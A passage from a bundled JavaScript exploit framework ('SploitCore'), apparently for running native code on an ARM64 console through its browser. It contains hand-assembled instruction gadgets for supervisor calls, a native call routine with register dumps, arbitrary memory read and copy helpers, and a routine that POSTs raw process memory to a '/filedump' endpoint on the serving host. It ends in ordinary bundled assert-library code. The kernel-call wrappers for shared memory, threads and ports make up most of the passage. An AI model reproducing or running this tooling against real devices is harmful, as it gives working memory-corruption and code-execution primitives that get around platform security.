		utils.log('Register dump post-code execution:');
		for (var i = 0; i <= 30; i++) {
			if (i === 0) {
				utils.log('X0: ' + utils.paddr(this.read8(dumparea, 0x320 >> 2)));
			} else if (i === 1) {
				utils.log('X1: ' + utils.paddr(this.read8(dumparea, 0x310 >> 2)));
			} else if (i === 2) {
				utils.log('X2: ' + utils.paddr(this.read8(dumparea, 0x318 >> 2)));
			} else if (i === 8) {
				utils.log('X8: ' + utils.paddr(this.read8(dumparea, 0x308 >> 2)));
			} else if (i === 9) {
				utils.log('X9: ' + utils.paddr(this.read8(dumparea, 0x328 >> 2)));
			} else if (i === 20) {
				utils.log('X20: ' + utils.paddr(this.read8(dumparea, 0x300 >> 2)));
			} else if (i === 16 || i === 19 || i === 29 || i === 30) {
				utils.log('X' + i + ': Not dumpable.');
			} else {
				utils.log('X' + i + ': ' + utils.paddr(this.read8(dumparea, (8 * i) >> 2)));
			}
		}
	}

	utils.dlog('Native code at ' + utils.paddr(funcptr) + ' returned: ' + utils.paddr(ret));

	this.free(context_load_struct);
	this.free(block_struct_0);
	this.free(block_struct_1);
	this.free(block_struct_2);
	this.free(block_struct_3);
	this.free(savearea);
	this.free(loadarea);
	this.free(dumparea);

	utils.dlog('Freed all buffers');

	utils.dlog('Forcing garbage collection...');
	this.gc();
	utils.dlog('Collected garbage!');

	return ret;
};

/**
	Call a specific svc with arguments
	@param {number} id - ID of the SVC
	@param {Array.<any>} args - Arguments to pass
	@param {boolean} dump_regs - Dump registers
 */
SploitCore.prototype.svc = function (id, args, dump_regs) {
	var svc_list = {
		0x01: [0xE0, 0x0F, 0x1F, 0xF8, 0x21, 0x00, 0x00, 0xD4],
		0x02: [0x41, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x03: [0x61, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x04: [0x81, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x05: [0xA1, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x06: [0xE1, 0x0F, 0x1F, 0xF8, 0xC1, 0x00, 0x00, 0xD4],
		0x07: [0xE1, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x08: [0xE0, 0x0F, 0x1F, 0xF8, 0x01, 0x01, 0x00, 0xD4],
		0x09: [0x21, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0A: [0x41, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0B: [0x61, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0C: [0xE0, 0x0F, 0x1F, 0xF8, 0x81, 0x01, 0x00, 0xD4],
		0x0D: [0xA1, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x0E: [0xE0, 0x07, 0xBF, 0xA9, 0xC1, 0x01, 0x00, 0xD4],
		0x0F: [0xE1, 0x01, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x10: [0x01, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x11: [0x21, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x12: [0x41, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x13: [0x61, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x14: [0x81, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x15: [0xE0, 0x0F, 0x1F, 0xF8, 0xA1, 0x02, 0x00, 0xD4],
		0x16: [0xC1, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x17: [0xE1, 0x02, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x18: [0xE0, 0x0F, 0x1F, 0xF8, 0x01, 0x03, 0x00, 0xD4],
		0x19: [0x21, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1A: [0x41, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1B: [0x61, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1C: [0x81, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x1D: [0xA1, 0x03, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		// 0x1E: ,
		0x1F: [0xE0, 0x0F, 0x1F, 0xF8, 0xE1, 0x03, 0x00, 0xD4],
		// 0x20: ,
		0x21: [0x21, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x22: [0x41, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		// 0x23: 0x,
		// 0x24: 0x,
		0x25: [0xE0, 0x0F, 0x1F, 0xF8, 0xA1, 0x04, 0x00, 0xD4],
		0x26: [0xC1, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x27: [0xE1, 0x04, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x28: [0x01, 0x05, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x29: [0xE0, 0x0F, 0x1F, 0xF8, 0x21, 0x05, 0x00, 0xD4],
		// 0x2A-0x2B
		0x2C: [0x81, 0x05, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x2D: [0xA1, 0x05, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		// 0x2E-0x4F
		0x50: [0xE0, 0x0F, 0x1F, 0xF8, 0x01, 0x0A, 0x00, 0xD4],
		0x51: [0x21, 0x0A, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6],
		0x52: [0x41, 0x0A, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6]
	};

	if (!(id in svc_list)) {
		throw new Error('Failed to call svc 0x' + id.toString(16) + '.');
	}

	return this.call(this.gadget(svc_list[id]), args, [], [], dump_regs);
};

/**
	TODO DOCS
 */
SploitCore.prototype.getTLS = function () {
	return this.call(this.gadget([0x60, 0xd0, 0x3b, 0xd5, 0xc0, 0x03, 0x5f, 0xd6]), []);
};

/**
	TODO DOCS
 */
SploitCore.prototype.str2buf = function (inp) {
	var len = inp.length + 1;
	var v = this.malloc(len);
	this.memview(v, len, function (view) {
		var u8b = new Uint8Array(view);
		for (var j = 0; j < len; ++j) { u8b[j] = inp.charCodeAt(j); }
		u8b[inp.length] = 0;
	});

	return v;
};

/**
	Initiate a memory dump over HTTP
	@param {u64} offset - Memory address to start from 
	@param {number} size - Number of bytes you wish to dump
	@param {string} fileName - Name of file, used to set Content-Disposition
 */
SploitCore.prototype.memdump = function (offset, size, fileName) {
	if(ArrayBuffer.isView(offset) || offset instanceof ArrayBuffer) {
		offset = this.getArrayBufferAddr(offset);
	}
	var totalSize = utils.trunc32(size);
	var idx = 0;

	utils.dlog('Dumping memory!');
	for (var idx = 0; idx < totalSize; idx += 0x800000) {
		size = totalSize - idx;
		size = size > 0x800000 ? 0x800000 : size;

		this.memview(utils.add2(offset, idx), size, function (ab) {
			var view = new Uint8Array(ab);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', fileName);
			xhr.send(view);
		});
	}
	utils.dlog('Dumped memory succesfully!');
};

/**
	Forces the garbage collector to run
 */
SploitCore.prototype.gc = function () {
	utils.dlog('Beginning GC force');
	function sub (depth) {
		utils.dlog('GC force ' + depth);
		if (depth > 0) {
			var arr = [];
			utils.dlog('Building...');
			for (var i = 0; i < 10; ++i) {
				arr.push(new Uint8Array(0x40000));
			}
			utils.dlog('Shifting...');
			while (arr.length > 0) {
				arr.shift();
			}
			sub(depth - 1);
		}
	}
	sub(20);
	utils.dlog('GC should be solid');
};

/**
	Reads a string from memory
	@param {u64} addr - Address to start from
	@param {number} length - Number of bytes to read
	@returns {string}
 */
SploitCore.prototype.readString = function (addr, length) {
	if (arguments.length === 1) {
		length = -1;
	}

	return this.memview(addr, 0xFFFFFFFF, function (view) {
		var u8b = new Uint8Array(view);
		var out = '';

		for (var i = 0; (length === -1 && u8b[i] !== 0) || (length !== -1 && i < length); i++) {
			out += String.fromCharCode(u8b[i]);
		}

		return out;
	});
};

/**
	Copy memory from one region to another
	@param {u64} dst - Base destination address
	@param {u64} src - Base source address
	@param {number} size - Number of bytes to copy
 */
SploitCore.prototype.memcpy = function (dst, src, size) {
	this.call(this.gadget('eb0301cb690940923f0102eb62020054c90200b4e80301aaea0300aa'), [dst, src, size]);
};

SploitCore.prototype.IFile = IFile;
SploitCore.prototype.IFileSystem = IFileSystem;
SploitCore.prototype.IDirectory = IDirectory;

module.exports = SploitCore;

},{"../config":1,"./AsyncCaller":2,"./fs/IDirectory":5,"./fs/IFile":6,"./fs/IFileSystem":7,"./sdbcore":11,"./sploitMixin":12,"./svc":14,"./utils":15}],14:[function(require,module,exports){
var Result = require('./Result');
var ResultCode = require('./ResultCode');
var utils = require('./utils');

var svcMixin = {};
svcMixin.svcWithResult = function (id, args, dumpRegs) {
	var ret = this.svc(id, args, dumpRegs);
	if (ret[0] !== 0 || ret[1] !== 0) {
		return new Result.Err(new ResultCode(ret));
	} else {
		return Result.NullOk;
	}
};

/*
  Usages:
  svcCreateTransferMemory(size)
  svcCreateTransferMemory(arrayBuffer)
  svcCreateTransferMemory(address, size)
  svcCreateTransferMemory(arrayBuffer, permission)
  svcCreateTransferMemory(address, size, permission)
*/
svcMixin.svcCreateTransferMemory = function () {
	var address;
	var size;
	var permission = 0;
	switch (arguments.length) {
	case 0:
		throw new Error('expected at least one argument');
	case 1:
		if (Array.isArray(arguments[0]) || typeof (arguments[0]) === 'number') {
			size = arguments[0];
			break;
		}
		if (arguments[0] instanceof ArrayBuffer) {
			if (!this.isBrowser) {
				throw new Error("don't try to make transfer memory with ArrayBuffers if you're not the browser please");
			}
			address = this.getArrayBufferAddr(arguments[0]);
			size = [arguments[0].byteLength, 0];
			break;
		}
		throw new Error('invalid usage, single argument is expected to be a size, typed array, or ArrayBuffer');
	case 2:
		if (Array.isArray(arguments[0])) {
			address = arguments[0];
			size = arguments[1];
			break;
		}
		if (arguments[0] instanceof ArrayBuffer) {
			if (!this.isBrowser) {
				throw new Error("don't try to make transfer memory with ArrayBuffers if you're not the browser please");
			}
			address = this.getArrayBufferAddr(arguments[0]);
			size = arguments[0].byteLength;
			permission = arguments[1];
			break;
		}
		throw new Error('invalid usage, expected (address, size) or (arrayBuffer, permission)');
	case 3:
		address = arguments[0];
		size = arguments[1];
		permission = arguments[2];
		break;
	default:
		throw new Error('invalid usage');
	}
	if (address === undefined) {
		address = this.malloc(size);
	}

	address = utils.pad64(address);
	size = utils.pad64(size);
	permission = utils.pad64(permission);

	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x15, [handleBuffer, address, size, permission]).replaceValue(handleBuffer[0]);
};

/*
  Usages:
  svcCreateSharedMemory(size)
  svcCreateSharedMemory(size, permission)
  svcCreateSharedMemory(size, permission1, permission2)
*/
svcMixin.svcCreateSharedMemory = function (size, permission1, permission2) {
	if (permission1 === undefined) {
		permission1 = 3; // RW
	}
	if (permission2 === undefined) {
		permission2 = permission1;
	}

	if (typeof (size) === 'number') { size = [size, 0]; }
	if (typeof (permission1) === 'number') { permission1 = [permission1, 0]; }
	if (typeof (permission2) === 'number') { permission2 = [permission2, 0]; }

	if (!Array.isArray(size)) { throw new Error('invalid size type'); }
	if (!Array.isArray(permission1)) { throw new Error('invalid permission1 type'); }
	if (!Array.isArray(permission2)) { throw new Error('invalid permission2 type'); }

	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x50, [handleBuffer, size, permission1, permission2]).replaceValue(handleBuffer[0]);
};

/*
  Usages:
  svcMapSharedMemory(handle, size)
  svcMapSharedMemory(handle, size, perm)
  svcMapSharedMemory(handle, addr, size, perm)

  Returns:
  Mapped address
 */
svcMixin.svcMapSharedMemory = function (handle) {
	var size;
	var addr;
	var perm = 3;
	switch (arguments.length) {
	case 3:
		perm = arguments[2];
		// fallthrough
	case 2:
		size = arguments[1];
		addr = this.findUnmappedRegion(size);
		break;
	case 4:
		addr = arguments[1];
		size = arguments[2];
		perm = arguments[3];
		break;
	default:
		throw new Error('invalid usage');
	}

	return this.svcWithResult(0x13, [handle, addr, size, perm]).replaceValue(addr);
};

/*
  Usages:
  svcMapTransferMemory(handle, size)
  svcMapTransferMemory(handle, size, perm)
  svcMapTransferMemory(handle, addr, size, perm)

  Returns:
  Mapped address
 */
svcMixin.svcMapTransferMemory = function (handle) {
	var size;
	var addr;
	var perm = 3;
	switch (arguments.length) {
	case 3:
		perm = arguments[2];
		// fallthrough
	case 2:
		size = arguments[1];
		addr = this.findUnmappedRegion(size);
		break;
	case 4:
		addr = arguments[1];
		size = arguments[2];
		perm = arguments[3];
		break;
	default:
		throw new Error('invalid usage');
	}

	return this.svcWithResult(0x51, [handle, addr, size, perm]).replaceValue(addr);
};

svcMixin.svcUnmapTransferMemory = function (handle, addr, size) {
	return this.svcWithResult(0x52, [handle, addr, size]);
};

svcMixin.svcGetSystemTick = function () {
	var info = new Uint32Array(2);
	return this.svcWithResult(0x29, [info, 10, 0, [0xFFFFFFFF, 0xFFFFFFFF]]).replaceValue([info[0], info[1]]); // GetSystemTick
};

svcMixin.svcQueryMem = function (addr, raw) {
	if (arguments.length === 1) { raw = false; }

	var meminfo = new Uint32Array(12);
	var pageinfo = new Uint32Array(2);

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['NONE', '(1)', '(2)', 'CODE-STATIC', 'CODE', 'HEAP', 'SHARED-MEM-BLOCK', 'MODULE-CODE-STATIC', 'MODULE-CODE', 'STACK-MIRROR', 'THREAD-LOCAL-STORAGE', 'MEMORY_MIRROR', '(15)', 'RESERVED'];
	return this.svcWithResult(0x6, [meminfo, pageinfo, addr]).map(() => {
		var ms = meminfo[4];
		if (!raw && ms < memstates.length) { ms = memstates[ms]; } else if (!raw) { ms = 'UNKNOWN'; }
		var mp = meminfo[6];
		if (!raw && mp < memperms.length) { mp = memperms[mp]; }
    
		return [[meminfo[0], meminfo[1]], [meminfo[2], meminfo[3]], ms, mp, [pageinfo[0], pageinfo[1]]];
	});
};

svcMixin.svcCloseHandle = function (handle) {
	return this.svcWithResult(0x16, [handle]);
};

svcMixin.svcConnectToPort = function (portName) {
	var handleBuffer = new Uint32Array(2);
	var ret = this.svcWithResult(0x1F, [handleBuffer, utils.str2ab(portName)]).replaceValue([handleBuffer[0], handleBuffer[1]]);
	return ret;
};

svcMixin.svcSendSyncRequestWithUserBuffer = function (addr, size, handle) {
	return this.svcWithResult(0x22, [addr, size, handle]);
};

svcMixin.svcCreateThread = function (entry, arg, stacktop, prio, processorId) {
	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x8, [handleBuffer, entry, arg, stacktop, prio, processorId]).replaceValue([handleBuffer[0], handleBuffer[1]]);
};

svcMixin.svcStartThread = function (handle) {
	return this.svcWithResult(0x9, [handle]);
};

svcMixin.svcAcceptSession = function (port) {
	var handleBuffer = new Uint32Array(2);
	return this.svcWithResult(0x41, [handleBuffer, port]).replaceValue(handleBuffer[0]);
};

svcMixin.svcReplyAndReceiveWithUserBuffer = function (buf, handles, reply, timeout) {
	var handleIdxBuffer = new Uint32Array(2);
	return this.svcWithResult(0x44, [handleIdxBuffer, buf, buf.byteLength, handles ? new Uint32Array(handles) : 0, handles ? handles.length : 0, reply, timeout]).replaceValue(handleIdxBuffer[0]);
};

svcMixin.svcWaitSynchronization = function (handles, timeout) {
	var handlesBuffer = new Uint32Array(handles);
	var handleIdxBuffer = new Uint32Array(1);
	return this.svcWithResult(0x18, [handleIdxBuffer, handlesBuffer, handlesBuffer.length, timeout]).replaceValue(handleIdxBuffer[0]);
}

module.exports = svcMixin;

},{"./Result":3,"./ResultCode":4,"./utils":15}],15:[function(require,module,exports){
/* eslint no-global-assign: "off" */
/* global XMLHttpRequest */
var DEBUG = false;

var utils = exports;

exports.paddr = function paddr (lo, hi) {
	if (arguments.length === 1) {
		hi = lo[1];
		lo = lo[0];
	}
	var slo = ('00000000' + lo.toString(16)).slice(-8);
	var shi = ('00000000' + hi.toString(16)).slice(-8);
	return '0x' + shi + slo;
};

exports.parseAddr = function parseAddr (addr) {
	addr = "0000000000000000" + addr.replace('0x', '');
	addr = addr.slice(addr.length - 16);
	var arr = [addr.slice(0, 8), addr.slice(8, 16)];
	var hi = parseInt(arr[0], 16);
	var lo = parseInt(arr[1], 16);
	return [ lo, hi ];
};

exports.nullptr = function nullptr (addr) {
	return addr[0] === 0 && addr[1] === 0;
};

exports.eq = function eq (a, b) {
	return a[0] === b[0] && a[1] === b[1];
};

exports.add2 = function add2 (addr, off) {
	if (typeof off === 'number') {
		if (off >= 0) {
			off = [off, 0];
		} else {
			off = [(0xFFFFFFFF + off + 1) >>> 0, 0xFFFFFFFF];
		}
	}

	var alo = addr[0];
	var ahi = addr[1];
	var blo = off[0];
	var bhi = off[1];

	var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
	var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;

	if ((nlo < alo && blo > 0) || (nlo === alo && blo !== 0)) {
		nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
	} else if (nlo > alo && blo < 0) {
		nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
	}

	return [nlo, nhi];
};

exports.sub2 = function sub2 (addr, off) {
	if (typeof off === 'number') {
		if (off >= 0) {
			off = [off, 0];
		} else {
			off = [(0xFFFFFFFF + off + 1) >>> 0, 0xFFFFFFFF];
		}
	}

	off = exports.add2([off[0] ^ 0xFFFFFFFF, off[1] ^ 0xFFFFFFFF], 1);
	return exports.add2(addr, off);
};

exports.send = function send (ep, data) {
	var msg = {
		msg: data
	};
	var jsonstr = JSON.stringify(msg);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/json');
		xhr.send(jsonstr);
	} catch (e) {

	}
};

exports.pushCache = function pushCache (cache) {
	exports.send('cache', cache);
};

exports.dlog = function dlog (msg) {
	if (DEBUG) {
		log(msg);
	}
};

exports.toHex = function (d) {
	return d.toString(16);
};

/*
  example:
  utils.packBitfield([
    {targetBegin: 16, size: 4},
    {targetBegin: 20, targetEnd: 24},
    {targetBegin: 24, size: 4, sourceBegin: 2}], [5, 6, 7])
 */
exports.packBitfield = function (spec, values) {
	var bitfield = 0;
	if(spec.length !== values.length) {
		throw "bitfield spec doesn't match number of provided values";
	}
	for(var i = 0; i < spec.length; i++) {
		var s = spec[i];
		var v = values[i];
    
		var tb = s.targetBegin;
		var te;
		var sb = s.sourceBegin === undefined ? 0 : s.sourceBegin;
		var se;
		var size;
		if(s.targetEnd && !s.size && !s.sourceEnd) {
			te = s.targetEnd;
			size = s.targetEnd - tb;
			se = sb + size;
		} else if(s.size && !s.targetEnd && !s.sourceEnd) {
			te = s.targetBegin + s.size;
			se = sb + s.size;
			size = s.size;
		} else if(s.sourceEnd && !s.size && !s.targetEnd) {
			se = s.sourceEnd;
			size = s.sourceEnd - sb;
			te = s.tb + size;
		} else if(s.targetEnd - tb === s.sourceEnd - sb) {
			size = s.targetEnd - tb;
			if(s.size && s.size !== size) {
				throw "size does not match";
			}
		} else {
			throw "bitfield spec number " + i + " needs one of targetEnd, size, or sourceEnd";
		}

		bitfield = bitfield | (((v >> sb) & ((1<<size)-1)) << tb);
	}

	return bitfield;
};

exports.unpackBitfield = function (spec, bitfield) {
	return spec.map((s) => {
		var tb = s.targetBegin;
		var te;
		var sb = s.sourceBegin === undefined ? 0 : s.sourceBegin;
		var se;
		var size;
		if(s.targetEnd && !s.size && !s.sourceEnd) {
			te = s.targetEnd;
			size = s.targetEnd - tb;
			se = sb + size;
		} else if(s.size && !s.targetEnd && !s.sourceEnd) {
			te = s.targetBegin + s.size;
			se = sb + s.size;
			size = s.size;
		} else if(s.sourceEnd && !s.size && !s.targetEnd) {
			se = s.sourceEnd;
			size = s.sourceEnd - sb;
			te = s.tb + size;
		} else if(s.targetEnd - tb === s.sourceEnd - sb) {
			size = s.targetEnd - tb;
			if(s.size && s.size !== size) {
				throw "size does not match";
			}
		} else {
			throw "bitfield spec number " + i + " needs one of targetEnd, size, or sourceEnd";
		}

		return ((bitfield >> tb) & ((1<<size)-1)) << sb;
	});
};

exports.assertu32 = function (num) {
	if(!Number.isInteger(num)) {
		throw new Error("expected integer");
	}
	if(num > 0xFFFFFFFF) {
		throw new Error("too large for u32");
	}
	if(num < 0) {
		throw new Error("expected positive integer");
	}
	return num;
};

exports.assertu64 = function (arr) {
	if(!Array.isArray(arr)) {
		throw new Error("expected array");
	}
	if(arr.length !== 2) {
		throw new Error("expected [lo, hi] pair");
	}
	return [this.assertu32(arr[0]), this.assertu32(arr[1])];
};

exports.trunc32 = function (num) {
	if(Array.isArray(num)) {
		if(num[1] !== 0) {
			throw new Error("high 32 bits must be clear");
		}
		return this.assertu32(num[0]);
	} else if(typeof(num) === "number") {
		return this.assertu32(num);
	} else {
		throw new Error("expected [lo,hi] or u32");
	}
};

// truncate to less than 32 bits, will always return number
// throw when truncating non-zero bits
exports.trunclt32 = function (num, bits) {
	if(bits > 32) {
		throw new Error("can't truncate > 32 bits with trunclt32");
	}
	if(Array.isArray(num) && this.assertu64(num)) {
		if(num[1] !== 0) {
			throw new Error("high " + (64-bits) + " bits must be clear");
		}
		num = this.assertu32(num[0]);
	} else if(typeof(num) === "number") {
		num = this.assertu32(num);
	} else {
		throw new Error("expected [lo,hi] or u32");
	}
	// for some reason, a >> 32 == a. that makes literally no sense.
	if(bits == 32 ? 0 : (num >> bits) > 0) {
		throw new Error("number is too large for " + bits + " bits");
	}
	return num;
};

// truncate to less than 64 bits, will always return [lo, hi]
// throw when truncating non-zero bits
exports.trunclt64 = function (num, bits) {
	num = this.pad64(num);
	if(this.bits <= 32) {
		return [this.trunclt32(num), 0];
	}
	// for some reason, a >> 32 == a. that makes literally no sense.
	if(bits == 64 ? 0 : (num[1] >> (bits-32)) > 0) {
		throw new Error("number is too large for " + bits + " bits");
	}
	return num;
};

exports.pad64 = function (num) {
	if(Array.isArray(num)) {
		return this.assertu64(num);
	} else if(typeof(num) === "number") {
		return [this.assertu32(num), 0];
	} else {
		throw new Error("expected [lo,hi] or number");
	}
};

console = {
	log: function (msg) {
		exports.send('log', msg);
	}
};

var log = console.log;

exports.log = log;

exports.dump = function (name, buf, count) {
	for (var j = 0; j < count; ++j) { utils.log(name + '[' + j + '] == 0x' + buf[j].toString(16)); }
};

exports.hexdump = function (name, inp, count) {
	var buf;
	var u8b;

	if (inp instanceof ArrayBuffer || inp instanceof Uint32Array) {
		buf = inp;
		u8b = new Uint8Array((inp instanceof ArrayBuffer) ? buf : buf.buffer);
		if (count === undefined) {
			count = u8b.length;
		}
	} else {
		buf = new ArrayBuffer(inp.length * 4);
		var u32b = new Uint32Array(buf);
		u8b = new Uint8Array(buf);
		if (count === undefined) {
			count = u8b.length;
		}
		for (var i = 0; i < inp.length && i < count; i++) {
			u32b[i] = inp[i];
		}
	}
	var rows = Math.ceil(count / 16.0);
	var addrColumnWidth = (name + '+0x' + (rows * 16).toString(16)).length;
	var dumpWidth = (3 * 16) + 1; // 2 characters + 1 space for each of the 16 bytes, and the space between u32s

	function rjust (string, width, chr) {
		var fill = '';
		while (fill.length < width - string.length) {
			fill += chr;
		}
		return fill + string;
	}

	function ljust (string, width, chr) {
		var fill = '';
		while (fill.length < width - string.length) {
			fill += chr;
		}
		return string + fill;
	}

	for (i = 0; i < rows; i++) {
		var offset = i * 16;
		var hexlinedump = '';
		var asciilinedump = '';
		for (var j = 0; j < 16 && offset + j < count; j++) {
			if (j !== 0) {
				hexlinedump += ' ';
			}
			hexlinedump += rjust(u8b[offset + j].toString(16), 2, '0');
			if (j === 7) hexlinedump += ' ';

			asciilinedump += String.fromCharCode(u8b[offset + j]).replace(/[^\x20-\x7E]+/g, '.');
		}
		var linedump = ljust(hexlinedump, dumpWidth, ' ') + '| ' + ljust(asciilinedump, 16, ' ') + ' |';
		utils.log(ljust(name + '+0x' + offset.toString(16), addrColumnWidth, ' ') + ' | ' + linedump);
	}
};

exports.str2ab = function (str, length) {
	if(length === undefined) {
		length = str.length + 1;
	} else {
		if(length < str.length + 1) {
			throw new Error("buffer is too small to pack string");
		}
	}
	var ab = new ArrayBuffer(length);
	var u8 = new Uint8Array(ab);
	for (var i = 0; i < str.length; i++) {
		u8[i] = str.charCodeAt(i);
	}
	u8[str.length + 1] = 0;
	return ab;
};

exports.u8a2str = function (u8) {
	var str = "";
	for (var i = 0; i < u8.length; i++) {
		str+= String.fromCharCode(u8[i]);
	}
	return str;
};

exports.u8a2nullstr = function (u8) {
	var str = "";
	for (var i = 0; i < u8.length; i++) {
		if(u8[i] === 0) {
			break;
		}
		str+= String.fromCharCode(u8[i]);
	}
	return str;
};

exports.str2u64 = function (inp) {
	if (inp.length > 8) {
		throw new Error("string too long");
	}
	if (inp.length === 0) {
		return [0, 0];
	}
	var len = 8;
	var buf = new ArrayBuffer(len);
	var u8b = new Uint8Array(buf);
	for (var j = 0; j < inp.length; ++j) { u8b[j] = inp.charCodeAt(j); }
	for (j = inp.length; j < len; ++j) { u8b[j] = 0; }

	var u32b = new Uint32Array(buf);
	return [u32b[0], u32b[1]];
};

},{}],16:[function(require,module,exports){
(function (global){
'use strict';

// compare and isBuffer taken from https://github.com/feross/buffer/blob/680e9e5e488f22aac27599a57dc844a6315928dd/index.js
// original notice:

/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <feross@feross.org> <http://feross.org>
 * @license  MIT
 */
function compare(a, b) {
  if (a === b) {
    return 0;
  }

  var x = a.length;
  var y = b.length;

  for (var i = 0, len = Math.min(x, y); i < len; ++i) {
    if (a[i] !== b[i]) {
      x = a[i];
      y = b[i];
      break;
    }
  }

  if (x < y) {
    return -1;
  }
  if (y < x) {
    return 1;
  }
  return 0;
}
function isBuffer(b) {
  if (global.Buffer && typeof global.Buffer.isBuffer === 'function') {
    return global.Buffer.isBuffer(b);
  }
  return !!(b != null && b._isBuffer);
}

// based on node assert, original notice:

// http://wiki.commonjs.org/wiki/Unit_Testing/1.0
//
// THIS IS NOT TESTED NOR LIKELY TO WORK OUTSIDE V8!
//
// Originally from narwhal.js (http://narwhaljs.org)
// Copyright (c) 2009 Thomas Robinson <280north.com>
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the 'Software'), to
// deal in the Software without restriction, including without limitation the
// rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
// sell copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
// ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
// WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

var util = require('util/');
var hasOwn = Object.prototype.hasOwnProperty;
var pSlice = Array.prototype.slice;
var functionsHaveNames = (function () {
  return function foo() {}.name === 'foo';
}());
function pToString (obj) {
  return Object.prototype.toString.call(obj);
}
function isView(arrbuf) {
  if (isBuffer(arrbuf)) {
    return false;
  }
  if (typeof global.ArrayBuffer !== 'function') {
    return false;
  }
  if (typeof ArrayBuffer.isView === 'function') {
    return ArrayBuffer.isView(arrbuf);
  }
  if (!arrbuf) {
    return false;
  }
  if (arrbuf instanceof DataView) {
    return true;
  }
  if (arrbuf.buffer && arrbuf.buffer instanceof ArrayBuffer) {
    return true;
  }
  return false;
}
// 1. The assert module provides functions that throw
// AssertionError's when particular conditions are not met. The
// assert module must conform to the following interface.

var assert = module.exports = ok;

// 2. The AssertionError is defined in assert.
// new assert.AssertionError({ message: message,
//                             actual: actual,
//                             expected: expected })

var regex = /\s*function\s+([^\(\s]*)\s*/;
// based on https://github.com/ljharb/function.prototype.name/blob/adeeeec8bfcc6068b187d7d9fb3d5bb1d3a30899/implementation.js
function getName(func) {
  if (!util.isFunction(func)) {
    return;
  }
  if (functionsHaveNames) {
    return func.name;
  }
  var str = func.toString();
  var match = str.match(regex);
  return match && match[1];
}
assert.AssertionError = function AssertionError(options) {
  this.name = 'AssertionError';
  this.actual = options.actual;
  this.expected = options.expected;
  this.operator = options.operator;
  if (options.message) {
    this.message = options.message;
    this.generatedMessage = false;
  } else {
    this.message = getMessage(this);
    this.generatedMessage = true;
  }
  var stackStartFunction = options.stackStartFunction || fail;
  if (Error.captureStackTrace) {
    Error.captureStackTrace(this, stackStartFunction);
  } else {
    // non v8 browsers so we can have a stacktrace
    var err = new Error();
    if (err.stack) {
      var out = err.stack;

      // try to strip useless frames
      var fn_name = getName(stackStartFunction);
      var idx = out.indexOf('\n' + fn_name);
      if (idx >= 0) {
        // once we have located the function frame
        // we need to strip out everything before it (and its line)
        var next_line = out.indexOf('\n', idx + 1);
